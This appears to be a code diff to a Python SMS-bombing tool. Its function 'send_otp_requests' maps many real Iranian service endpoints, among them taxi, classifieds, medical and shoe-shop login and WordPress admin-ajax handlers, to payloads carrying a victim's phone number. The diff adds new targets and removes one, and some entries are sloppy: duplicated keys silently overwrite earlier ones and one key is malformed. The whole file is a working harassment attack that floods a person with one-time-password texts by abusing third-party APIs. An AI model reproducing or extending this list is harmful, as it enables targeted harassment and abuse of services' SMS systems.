@@ -1,8 +1,14 @@
 def send_otp_requests(number):
     url_payload_map = {
         'snapp': ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {'cellphone': '0' + number}),
+        'paaakar': ('https://api.paaakar.com/v1/customer/register-login?version=new1', {'mobile': '0' + number}),
+        'pashikshoes': ('https://api.pashikshoes.com/v1/customer/register-login', {'mobile': '0' + number}),
+        'shimashoes': ('https://shimashoes.com/api/customer/member/register/', { 'email': '0' + number}),
         'lendo': ('https://api.lendo.ir/api/customer/auth/send-otp', {'mobile': '0' + number}),
         'buskool': ('https://www.buskool.com/send_verification_code', {'phone': '0' + number}),
+        'sheypoor': ('https://www.sheypoor.com/api/v10.0.0/auth/send', {'username': '0' + number}),
+        'itoll': ('https://app.itoll.com/api/v1/auth/login', {'mobile': '0' + number}),
+        'banimode': ('https://mobapi.banimode.com/api/v2/auth/request', {'phone': '0' + number}),
         'torob': ('https://api.torob.com/v4/user/phone/send-pin', {'phone_number': '0' + number}),
         'drdr': ('https://drdr.ir/api/registerEnrollment/verifyMobile', {'phoneNumber': '0' + number, 'userType': 'PATIENT'}),
         'itoll': ('https://app.itoll.ir/api/v1/auth/login', {'mobile': '0' + number}),
@@ -38,7 +44,6 @@ def send_otp_requests(number):
             'type': 1,
             'value': '0' + number
         }),
-        'filmnet': (f'https://filmnet.ir/api-v2/access-token/users/0{number}/otp', None),
         'namava': ('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', {'UserName': '+98' + number}),
         'snappapps': ('https://api.snapp.ir/api/v1/sms/link', {'phone': '0' + number}),
         'doctoreto': ('https://api.doctoreto.com/api/web/patient/v1/accounts/register', {
@@ -65,6 +70,25 @@ def send_otp_requests(number):
             'action': 'stm_login_register',
             'type': 'mobile',
             'input': '0'+number
+        }),
+        'mellishoes': ('https://mellishoes.ir/wp-admin/admin-ajax.php', {
+            'action': 'websima_auth_account_detection',
+            'account_detection_nonce_field': '21737b7e2d',
+            'mobile': '0'+number,
+            '_wp_http_referer':'/'
+        }),
+        'setshoe': ('https://setshoe.ir/wp-admin/admin-ajax.php', {
+            'action': 'stm_login_register',
+            'type': 'mobile',
+            'input': '0'+number,
+        }),
+        'maxbax': ('https://maxbax.com/wp-admin/admin-ajax.php', {
+            'action': 'bakala_send_code',
+            'phone_email': '0'+number,
+        }),
+        'maxbax': ('https://shik.style/wp-admin/admin-ajax.php', {
+            'action': 'login',
+            'form=phone': number,
         }),
     }
 
